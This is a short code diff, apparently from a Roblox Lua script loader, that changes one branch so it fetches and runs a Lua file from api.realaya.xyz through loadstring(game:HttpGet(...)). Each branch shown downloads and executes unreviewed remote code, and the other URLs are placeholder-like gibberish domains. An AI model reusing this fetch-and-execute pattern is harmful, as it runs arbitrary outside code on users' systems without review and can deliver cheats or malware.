@@ -7,7 +7,7 @@ local game_map = {
         elseif _G.V4Mode then
             loadstring(game:HttpGet("https://sdhfiudashdfhe12e.xnxx3"))()
         else
-            loadstring(game:HttpGet("https://sdhfiudashdfhe12e.xnxx4"))()
+            loadstring(game:HttpGet("https://api.realaya.xyz/v1/files/l/rj0wpvqry4ier1d7060tlhipnkbwchfb.lua"))()
         end
     end,
 
